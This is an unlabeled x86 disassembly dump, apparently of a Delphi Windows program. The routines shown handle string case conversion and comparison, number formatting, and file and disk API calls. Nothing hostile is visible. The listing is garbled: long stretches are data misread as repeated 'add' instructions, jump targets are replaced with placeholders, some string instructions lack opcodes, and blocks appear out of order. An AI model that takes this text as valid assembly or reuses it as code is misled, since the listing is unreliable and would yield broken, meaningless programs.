pop ecx
pop ebp
retn 0x8
sub_406a89
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406ab1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ab8
retn
sub_406ac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406ae9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406af0
retn
sub_406afc
xchg esi eax
inc esi
add al dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ eax + 0x640000ff ] dh
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] dh
xchg esi eax
inc esi
add [ edx + 0x640000ff ] dh
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] dh
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] dh
inc esi
add [ ebp + 0x640000ff ] dh
xchg esi eax
inc esi
add [ esi + 0x640000ff ] dh
xchg esi eax
inc esi
add [ edi + 0x640000ff ] dh
xchg esi eax
inc esi
add [ eax + 0x640000ff ] bh
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] bh
xchg esi eax
inc esi
add [ edx + 0x640000ff ] bh
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] bh
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] bh
inc esi
add [ ebp + 0x640000ff ] bh
xchg esi eax
inc esi
add [ esi + 0x640000ff ] bh
xchg esi eax
inc esi
add [ edi + 0x640000ff ] bh
xchg esi eax
inc esi
add [ eax + 0x640000ff ] ah
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] ah
xchg esi eax
inc esi
add [ edx + 0x640000ff ] ah
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] ah
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] ah
inc esi
add [ ebp + 0x640000ff ] ah
xchg esi eax
inc esi
add [ esi + 0x640000ff ] ah
xchg esi eax
inc esi
add [ edi + 0x640000ff ] ah
xchg esi eax
inc esi
add [ eax + 0x640000ff ] ch
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] ch
xchg esi eax
inc esi
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_406df9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406e00
retn
sub_4078f8
fnstcw [ eax + 0x40 ]
add bl ah
js r-xdata
add [ eax ] al
add [ eax ] al
add ch ch
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x3effbf88 ] bh
js r-xdata
lodsb [ esi ]
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add cl cl
js r-xdata
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add cl dl
js r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ eax + 0x30004079 ] al
add [ eax ] al
add [ ecx + edx + 0x34880040 ] dl
inc eax
add [ esi + edx * 2 + 0x40 ] cl
add [ eax + 0x56 ] bl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add [ eax + 0x56 ] ch
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] bl
leave
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
xor al 0x71
inc esi
add [ ebx + 0x34158910 ] cl
jno r-xdata
arpl [ eax + 0x72 ] bp
outsd
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4078f83f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ecx + 0x40 ] 0x0
adc al 0x79
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx + rw-data ] ah
mov [ eax ] sub_407a08
pop ebx
retn
add [ ebx + 0x467f2815 ] cl
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
adc [ ecx + 0x46713415 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
sub_4079a8
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_4079c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
pop edi
pop esi
pop ebx
retn
sub_4079e8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c64
mov eax esi
pop esi
pop ebx
retn
sub_407a08
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_407a34
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407a08
pop ebx
retn
sub_407a6c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404250
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045dc
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407aa8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404250
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045dc
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407ae4
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407b14
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407b34
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407b88
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407b34
test eax eax
jne r-xdata
sub_407bac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404250
push eax
mov eax esi
call sub_404450
push eax
mov eax ebx
call sub_404250
push eax
mov eax ebx
call sub_404450
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407be4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404250
push eax
mov eax esi
call sub_404450
push eax
mov eax ebx
call sub_404250
push eax
mov eax ebx
call sub_404450
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407c34
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407c54
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404250
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f90
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4044b0
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407ca4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404250
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404250
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407d08
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407d1e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407d1e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d1e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407d54
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407d08
mov edx esi
pop eax
call sub_404080
add esp 0x10
pop esi
retn
sub_407d74
or cl cl
jne sub_407da8
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407da8
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407da8
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407da8
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e40
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407d74
mov edx esi
pop eax
call sub_404080
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407e68
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407d08
mov edx esi
pop eax
call sub_404080
add esp 0x20
pop esi
retn
xor edx edx
sub_407e90
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c84
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_4079c4
sub_407ee4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c84
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_407f04
mov eax [ rw-data ]
call sub_404d58
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404d58
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f14
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fe4
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f14
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fe4
sub_407f94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407c1c
test al al
je r-xdata
sub_407fd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409190
mov edx eax
test dl dl
je r-xdata
call sub_407f04
push ebp
mov eax [ rw-data ]
call sub_404d60
mov edx eax
mov eax [ rw-data ]
call sub_407f94
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404d60
mov edx eax
mov eax [ rw-data ]
call sub_407f94
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_40806c
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fe4
call sub_407f04
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fe4
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fe4
jmp r-xdata
pop esi
pop ebx
retn
sub_4080b8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404450
push eax
call CreateFileA
sub_408110
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404450
push eax
call CreateFileA
pop ebx
retn
sub_40813c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408168
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408194
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4081d4
push ebx
push esi
mov esi eax
mov eax esi
call sub_404250
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bc38
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408204
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404250
mov edi eax
mov eax ebx
call sub_404450
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4084c0
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bc38
cmp al 0x2
jne r-xdata
dec edi
sub_408254
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408204
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4044b0
pop edi
pop esi
pop ebx
retn
sub_40828c
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404450
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404080
add esp 0x108
pop esi
pop ebx
retn
sub_4082c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d34
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404d34
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408378
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4083a0
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4083d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404250
push eax
mov eax ebx
call sub_404450
mov edx eax
mov eax esi
pop ecx
call sub_4083a0
pop esi
pop ebx
retn
sub_4083f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_404450
mov edx eax
mov ecx edi
mov eax ebx
call sub_4083a0
pop edi
pop esi
pop ebx
retn
sub_408418
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_40843c
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40847c
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4084d4
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408548
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_40833c
mov esi eax
inc esi
mov eax esi
call sub_408528
mov ecx esi
mov edx ebx
call sub_408368
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408584
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40bc5c
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408368
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_4079c4
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_40860c
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
